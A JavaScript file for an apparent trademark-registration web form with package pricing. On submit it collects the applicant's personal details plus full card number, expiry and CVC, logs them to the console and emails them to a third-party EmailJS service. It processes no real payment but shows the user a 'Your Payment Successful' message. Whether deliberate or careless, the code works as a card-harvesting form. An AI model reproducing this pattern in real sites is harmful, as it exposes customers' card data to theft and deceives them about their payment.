let currentStep = 1;
const totalSteps = 7; // Update this to reflect total steps including payment
let packagePrice = 0; // Variable to store the package price

function showStep(step) {
    for (let i = 1; i <= totalSteps; i++) {
        document.getElementById(`step-${i}`).classList.remove('active');
    }
    document.getElementById(`step-${step}`).classList.add('active');
}

function nextStep(step) {
    if (validateStep(currentStep)) {
        currentStep = step;
        showStep(currentStep);
    }
}

function prevStep(step) {
    currentStep = step;
    showStep(currentStep);
}

function validateStep(step) {
    const formStep = document.getElementById(`step-${step}`);
    const inputs = formStep.querySelectorAll('input[required], textarea[required]');
    let isValid = true;

    inputs.forEach(input => {
        if (!input.checkValidity()) {
            isValid = false;
            input.classList.add('is-invalid');
        } else {
            input.classList.remove('is-invalid');
        }
    });

    return isValid;
}

// New function to update the payment amount based on selected package
function updatePaymentAmount() {
    const selectedPackage = document.querySelector('input[name="package"]:checked');
    if (selectedPackage) {
        switch (selectedPackage.value) {
            case 'basic':
                packagePrice = 35; // Package price
                break;
            case 'standard':
                packagePrice = 135; // Package price
                break;
            case 'premium':
                packagePrice = 225; // Package price
                break;
            default:
                packagePrice = 0; // Default to 0
        }
        document.getElementById('totalAmount').textContent = packagePrice; // Update the total amount display
    }
}

// Add event listeners to update the payment amount when a package is selected
const packageRadios = document.querySelectorAll('input[name="package"]');
packageRadios.forEach(radio => {
    radio.addEventListener('change', updatePaymentAmount);
});

document.getElementById('registrationForm').addEventListener('submit', function (event) {
    event.preventDefault();
    if (validateStep(currentStep)) {
        // Collect form data
        const formData = {
            markName: document.getElementById("markName").value,
            ownershipType: document.querySelector('input[name="ownershipType"]:checked').value,
            firstName: document.getElementById("firstName").value,
            lastName: document.getElementById("lastName").value,
            country: document.getElementById("country").value,
            address: document.getElementById("address").value,
            city: document.getElementById("city").value,
            state: document.getElementById("state").value,
            zip: document.getElementById("zip").value,
            phone: document.getElementById("phone").value,
            email: document.getElementById("email").value,
            description: document.getElementById("description").value,
            searchType: document.querySelector('input[name="searchType"]:checked').value,
            package: document.querySelector('input[name="package"]:checked').value,
            processingSpeed: document.querySelector('input[name="processingSpeed"]:checked').value,
            termsAccepted: document.getElementById("terms").checked,
            cardNumber: document.getElementById("cardNumber").value,
            cardMM: document.getElementById("cardMM").value,
            cardYY: document.getElementById("cardYY").value,
            cardCVC: document.getElementById("cardCVC").value,
            pakegePrice: document.getElementById("totalAmount").textContent,
            
        };

        console.log(formData);
       

        emailjs.send("service_dmhl49c","template_glih28d", formData)
            .then((response) => {
                console.log("Success!", response.status, response.text);
                // alert("Your form has been submitted successfully!");
                Swal.fire({
                    icon: 'success',
                    title: 'Your Payment Successful',
                    text: 'Thanks You.',
                    confirmButtonText: 'OK'
                });
                document.getElementById('registrationForm').reset();
                showStep(1); // Reset to step 1
                currentStep = 1;
            }, (error) => {
                console.error("Failed to send form", error);
                alert("There was an error sending your form. Please try again.");
            });
    }
});


